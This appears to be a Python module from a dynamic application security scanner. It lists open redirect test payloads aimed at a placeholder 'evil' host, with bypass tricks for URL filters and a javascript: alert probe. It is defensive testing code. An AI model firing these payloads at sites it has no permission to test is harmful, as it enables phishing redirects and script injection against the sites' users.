"""
DevSecure360 — DAST Open Redirect Payloads
============================================
Sources: OWASP Testing Guide WSTG-CLNT-04.
"""


def get_payloads(target_domain: str = "evil.devsecure360.io") -> list:
    """
    Open redirect payloads. Confirmed when the response `Location` header
    contains the injected URL.
    """
    return [
        # Basic
        f"https://{target_domain}",
        f"http://{target_domain}",

        # Protocol-relative (bypasses scheme checks)
        f"//{target_domain}",
        f"\\/\\/{target_domain}",

        # JavaScript URI
        f"javascript:alert(document.domain)",
        "javascript://",

        # Bypass: leading slash tricks
        f"/{target_domain}",
        f"/{target_domain}/%2f..",

        # Bypass: URL encoding
        f"https%3A%2F%2F{target_domain}",
        f"%2F%2F{target_domain}",

        # Bypass: null byte
        f"https://{target_domain}%00",

        # Bypass: @-trick
        f"https://legit.example.com@{target_domain}",

        # Bypass: backslash
        f"https://{target_domain}\\legit.example.com",

        # Whitelist bypass
        f"https://{target_domain}.legit.example.com",
        f"https://legit.example.com.{target_domain}",
    ]


ORACLE_DOMAIN = "evil.devsecure360.io"
